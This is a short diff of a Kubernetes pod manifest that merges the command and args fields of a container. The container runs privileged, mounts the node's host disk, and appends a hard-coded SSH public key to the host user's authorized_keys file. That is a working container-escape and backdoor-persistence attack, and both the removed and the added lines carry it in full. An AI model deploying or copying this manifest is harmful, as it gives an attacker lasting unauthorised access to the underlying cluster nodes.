@@ -8,8 +8,7 @@ spec:
       containers:
       - name: sth-container
         image: "ubuntu:18.04"
-        command: ["/bin/sh","-c"]
-        args: ["mkdir /tmp/host && mount /dev/nvme0n1p1 /tmp/host && cat /tmp/host/etc/hostname && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB2VAmmJZnezfks5wIXxl/51mMZOfjyCXjb8cu2Q2HO3 bongtrop@bongtrop' >> /tmp/host/home/ubuntu/.ssh/authorized_keys && umount /tmp/host && rmdir /tmp/host && echo 'Inject pubkey DONE' && sleep 1337;"]
+        command: ["/bin/sh","-c", "mkdir /tmp/host && mount /dev/nvme0n1p1 /tmp/host && cat /tmp/host/etc/hostname && echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB2VAmmJZnezfks5wIXxl/51mMZOfjyCXjb8cu2Q2HO3 bongtrop@bongtrop' >> /tmp/host/home/ubuntu/.ssh/authorized_keys && umount /tmp/host && rmdir /tmp/host && echo 'Inject pubkey DONE' && sleep 1337;"]
         securityContext:
           privileged: true
       restartPolicy: Never
